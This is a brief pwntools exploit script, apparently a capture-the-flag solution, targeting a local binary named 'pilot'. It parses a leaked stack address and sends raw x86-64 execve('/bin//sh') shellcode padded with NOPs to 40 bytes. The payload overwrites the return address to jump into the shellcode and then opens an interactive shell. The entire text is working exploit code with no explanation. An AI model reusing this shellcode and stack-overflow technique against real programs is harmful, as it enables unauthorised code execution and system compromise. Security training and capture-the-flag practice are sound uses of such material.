from pwn import *



elf = context.binary = ELF("./pilot")
p = process()
p.recvuntil(b"[*]Location:")


STACK_LEAK  =  int(p.recvline().decode()[2:],16)

# gdb.attach(p)

payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05" # flat(asm(shellcraft.sh()))
payload = payload.ljust(40,asm(shellcraft.nop()))
payload += flat(STACK_LEAK)

p.sendline(payload)

p.interactive()